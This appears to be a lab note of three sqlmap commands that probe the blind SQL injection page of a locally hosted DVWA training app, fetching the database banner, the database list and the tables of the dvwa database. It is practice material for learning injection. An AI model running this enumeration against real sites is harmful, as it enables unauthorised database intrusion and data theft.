
```bash
sqlmap -u "http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie "PHPSESSID=fj7udg3et9hpkob046p05h75t3;security=low" -banner --threads 10

sqlmap -u "http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie "PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4;security=low" --dbs

sqlmap -u "http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie "PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4;security=low" -D dvwa --tables
```